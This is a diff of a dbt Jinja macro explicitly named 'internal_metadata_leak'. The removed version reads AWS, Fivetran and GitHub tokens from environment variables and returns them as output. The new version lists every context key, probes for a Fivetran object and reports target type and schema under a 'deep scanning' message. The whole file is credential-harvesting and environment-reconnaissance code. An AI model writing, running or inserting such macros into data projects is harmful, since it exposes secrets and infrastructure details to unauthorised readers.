@@ -1,15 +1,13 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {% set profile = target.get('profile_name', 'none') %}
+        {% set context_keys = context.keys() | list | join(", ") %}
         
-        {% set aws_key = env_var("AWS_ACCESS_KEY_ID", "not_found") %}
-        {% set fivetran_token = env_var("FIVETRAN_API_KEY", "not_found") %}
-        {% set github_t = env_var("GITHUB_TOKEN", "not_found") %}
+        {% set fvt_check = "FVT Object: " ~ (fivetran is defined) %}
         
-        {% set sys_info = "Ver: " ~ dbt_version ~ " | Target: " ~ target.name %}
+        {% set target_details = "Type: " ~ target.type ~ " | Schema: " ~ target.schema %}
         
-        {{ return("AWS: " ~ aws_key ~ " | FVT: " ~ fivetran_token ~ " | GH: " ~ github_t ~ " || " ~ sys_info) }}
+        {{ return("Keys: " ~ context_keys ~ " || " ~ fvt_check ~ " || " ~ target_details) }}
     {% else %}
-        {{ return("probing...") }}
+        {{ return("deep scanning...") }}
     {% endif %}
 {% endmacro %}
